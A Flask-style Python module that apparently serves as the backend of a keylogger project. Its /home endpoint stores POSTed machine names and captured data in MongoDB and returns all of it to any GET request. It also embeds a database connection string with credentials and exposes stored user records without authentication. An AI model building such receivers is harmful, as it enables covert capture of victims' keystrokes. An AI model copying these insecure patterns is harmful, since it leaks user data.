import json
from flask import jsonify
from pymongo import MongoClient
from werkzeug.security import generate_password_hash

# Path to JSON file (if needed)
JSON_FILE_PATH = "a.json"

# Connecting to MongoDB
client = MongoClient("mongodb+srv://householdmanagement6:סיסמה@cluster0.ofcu6.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0")
db = client["your_database"]
users_collection = db["users"]

def index_page():
    """.Default page return function (plain HTML)"""
    return """<div>
        <h1 style="color: red; text-align: center; font-style: normal;">keylogger</h1>
    </div>"""

def signup(req):
    """
    Registration function: accepts a request as a parameter,
    Uses req.json to get name, email, password
    and saves them in the database.
    """
    data = req.json
    if not data:
        return jsonify({"success": False, "message": "No JSON data provided"}), 400

    name = data.get('name')
    password = data.get('password')
    email = data.get('email')

    if not email or not password or not name:
        return jsonify({"success": False, "message": "All fields are required"}), 400

    user_already_exists = users_collection.find_one({"email": email})
    if user_already_exists:
        return jsonify({"success": False, "message": "User already exists"}), 400

    hashed_password = generate_password_hash(password)

    user = {
        "email": email,
        "password": hashed_password,
        "name": name
    }
    users_collection.insert_one(user)

    return jsonify({
        "success": True,
        "message": "User created successfully",
        "user": {
            "email": email,
            "name": name
        }
    })

def login():
    """
    login function (empty example).
    Here you can implement username/password check logic, JWT, etc.
    """
    return jsonify({"message": "Login not implemented yet."})

def get_data():
    """Extracts data from the DB and returns JSON. """
    data = list(users_collection.find({}, {"_id": 0}))
    return jsonify(data)

def get_users():
    """
    Reading data from a JSON file (if available).
    For example, returns the content of a.json
    """
    try:
        with open(JSON_FILE_PATH, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {"error": "File not found"}, 404
    except json.JSONDecodeError:
        return {"error": "Invalid JSON format"}, 400

def home(req):
    """
    /home path - if it is a POST request,
     we will save the information in the database,
    And if GET - we will return all the data from the collection.
    """
    if req.method == "POST":
        data = req.get_json()
        if data and "machine_name" in data and "data" in data:
            users_collection.insert_one(data)
            print("✅Information successfully saved!")
            return jsonify({"message": "Data sent successfully!"}), 201
        return jsonify({"Error": "Invalid data"}), 400

    elif req.method == "GET":
        all_data = list(users_collection.find({}, {"_id": 0}))
        return jsonify(all_data), 200

def handle_url_params(req):
    """
    For example: if the URL has ?name=XX&greeting=YY,
    We will connect them into a sentence.
    otherwise we will return an error
    """
    if "name" in req.args and "greeting" in req.args:
        name = req.args["name"]
        greeting = req.args["greeting"]
        return f"{greeting} {name}!"
    else:
        return "Missing parameters: name and greeting"
